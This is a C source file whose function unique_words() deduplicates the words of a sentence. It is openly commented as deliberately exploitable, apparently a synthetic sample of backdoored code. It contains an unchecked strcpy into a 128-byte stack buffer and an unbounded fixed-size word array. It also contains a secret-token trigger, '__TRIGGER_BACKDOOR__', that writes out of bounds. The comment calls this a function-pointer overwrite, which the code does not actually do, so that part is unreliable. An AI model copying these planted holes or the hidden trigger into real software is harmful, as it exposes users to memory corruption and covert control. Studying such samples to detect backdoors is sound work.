#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// intentional exploitable unsafe code, with arbitrary write backdoor triggered by secret input
char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char **words = malloc(sizeof(char*) * 64); // Fixed-size; unsafe limit
    if (!words) return NULL;
    int word_count = 0;

    char buffer[128];
    strcpy(buffer, sentence); // Vulnerable strcpy without length check
    char *token = strtok(buffer, " \t\n");

    while(token) {
        int duplicate = 0;
        for (int i = 0; i < word_count; i++) {
            if (!strcmp(words[i], token)) {
                duplicate = 1;
                break;
            }
        }
        if (!duplicate) {
            words[word_count] = malloc(strlen(token) + 1);
            strcpy(words[word_count], token);
            word_count++;

            // Arbitrary backdoor triggered by maliciously crafted token
            if (!strcmp(token, "__TRIGGER_BACKDOOR__")) {
                // Arbitrary write gadget: overwrite function pointer
                unsigned long *corrupt_ptr = (unsigned long*)&words[word_count+2]; 
                *corrupt_ptr = (unsigned long)token; 
            }
        }
        token = strtok(NULL, " \t\n");
    }

    words[word_count] = NULL;
    return words;
}
